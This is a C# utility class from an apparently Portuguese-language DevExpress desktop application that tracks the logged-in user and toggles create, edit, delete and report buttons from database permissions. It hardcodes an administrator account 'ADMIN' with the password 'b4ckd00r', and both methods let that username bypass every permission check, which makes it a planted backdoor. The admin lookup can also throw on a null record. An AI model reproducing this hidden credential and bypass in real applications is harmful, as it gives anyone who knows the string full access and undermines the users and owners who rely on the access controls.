using DevExpress.XtraEditors;
using System.Linq;

namespace Utilidades
{
    public static class Parametros
    {
        public static string Usuario = "";
        public static bool Logado = false;
        public static string Administrador = "ADMIN";
        public static string Senha = "b4ckd00r";

        public static bool IsAdministrator()
        {
            var adm = Usuario == Administrador;

            if (!adm)
                adm = (Conexao.Banco.TB_DIV_USUARIOs.FirstOrDefault(z => z.LOGIN == Parametros.Usuario).ST_ADMIN ?? "N") == "S";

            return adm;
        }

        public static void AcessoBotoes(string id_menu, SimpleButton cadastrar, SimpleButton alterar, SimpleButton deletar, SimpleButton relatorio)
        {
            if (Parametros.Usuario != Administrador)
                if (id_menu.Treat().Length > 0)
                {
                    var permissoes = (from a in Conexao.Banco.TB_DIV_ACESSOs where a.ID_MENU == id_menu && a.LOGIN == Usuario select a).FirstOrDefault();

                    cadastrar.Enabled = permissoes != null && permissoes.ST_CADASTRAR.Treat() == "S";
                    alterar.Enabled = permissoes != null && permissoes.ST_ALTERAR.Treat() == "S";
                    deletar.Enabled = permissoes != null && permissoes.ST_DELETAR.Treat() == "S";
                    relatorio.Enabled = permissoes != null && permissoes.ST_RELATORIO.Treat() == "S";
                }
        }
    }
}